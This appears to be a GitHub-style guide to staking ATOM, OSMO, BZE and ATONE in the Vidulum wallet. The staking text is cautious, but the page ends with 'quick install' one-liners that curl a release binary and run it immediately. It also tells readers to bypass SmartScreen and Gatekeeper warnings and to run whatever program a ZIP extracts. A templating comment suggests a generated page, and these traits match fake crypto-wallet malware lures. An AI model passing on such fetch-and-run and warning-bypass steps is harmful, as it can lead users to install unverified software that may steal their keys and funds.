![Vidulum](../assets/banner-article.png)

# Vidulum Cosmos Wallet: Staking ATOM, OSMO, BZE and ATONE

Four Cosmos chains in one wallet, and where delegation stops being a wallet question.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Cosmos chain support ships in the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1).

> Delegating ATOM is a chain action, not a wallet promise. The validator, the lock and the return are all on-chain.

Vidulum holds four Cosmos chains: Cosmos Hub, Osmosis, BeeZee and AtomOne, each with its own chain identifier and its own token. IBC moves value between them without wrapping. Delegation to validators is a Cosmos feature that happens on-chain, and this page separates that from the project's own VDL reward programme, which is a different thing entirely.

<!-- ARTICLE-BODY-BEGIN -->

## The four chains

| Chain | Chain ID | Token |
| --- | --- | --- |
| Cosmos Hub | cosmoshub-4 | ATOM |
| Osmosis | osmosis-1 | OSMO |
| BeeZee | beezee-1 | BZE |
| AtomOne | atomone-1 | ATONE |

Four separate networks, four separate balances, one wallet. Holding ATOM does not imply holding OSMO, and an address on one chain is not an address on another even when the format looks similar: the chain identifier is what distinguishes them.

## What IBC changes

IBC transfers move an asset between Cosmos chains while keeping it native, rather than issuing a wrapped version on the destination. For a holder moving ATOM between Cosmos Hub and Osmosis, that is the correct route and it is a transfer, not a trade.

Two consequences worth knowing. First, IBC needs the destination chain to be reachable, so a disconnected network blocks the transfer. Second, IBC is Cosmos-only: moving value from Cosmos to an EVM chain is a swap, with different mechanics and different risk.

## Delegation, and where this page stops

Delegation is a Cosmos chain mechanism: you bond tokens to a validator, the validator participates in consensus, and the chain handles rewards and unbonding under its own rules. None of that is specific to this wallet.

What this page will not do is invent a screen. Validator selection and the unbonding period are not documented in the material behind this page, so no button names, no validator lists and no unbonding durations are given. If your build shows a delegation flow, the chain's own rules still govern it: the wallet is the interface, not the authority.

## Cosmos staking is not the VDL programme

These get confused constantly. Cosmos delegation bonds ATOM, OSMO, BZE or ATONE to a validator on that chain, and the chain pays the reward in its own token. The VDL reward programme is the project's own scheme, paid in VDL, on terms the project sets.

They can both be true at once for the same holder, and neither implies the other. If a number you were quoted is in VDL, it is the programme; if it is in ATOM, it is the chain.

The VDL programme is covered separately in <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-staking-rewards-vdl-programme.md">Vidulum VDL staking rewards programme</a>.

## What to check before delegating

1. Confirm the chain is reachable; IBC and delegation both need current state.
2. Confirm which token you are bonding, and on which chain.
3. Read the chain's unbonding rules before committing, since bonded tokens are not liquid.
4. Keep a small balance of the chain's fee token for later transactions.

Delegation is not a send, and unbonding is not instant. Treat a bonded balance as committed until the chain says otherwise.

The <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-interest-rates-reward-terms.md">Vidulum Wallet interest rates and reward terms</a> page explains why no rate is quoted here.

The <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md">Vidulum Wallet multichain network list</a> shows the other chains in the wallet.

Cosmos support ships in the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> build you are already running.

## FAQ

### Does Vidulum support Cosmos staking?

It holds the four Cosmos chains, and delegation is a chain feature. This page does not describe a specific delegation screen because none is documented.

### Can I move ATOM to Osmosis?

Yes, by IBC, provided both chains are reachable.

### Is Cosmos staking the same as VDL rewards?

No. One is on-chain delegation paid in the chain's token; the other is the project's programme paid in VDL.

### What return will I get?

No rate is published in the material behind this page, and validator returns vary by chain. Check the chain, not this page.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[How rewards work](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-staking-rewards-vdl-programme.md) - [Full network table](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-multichain-wallet-cosmos-utxo-evm-solana.md) - [Interest rates and terms](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-interest-rates-reward-terms.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
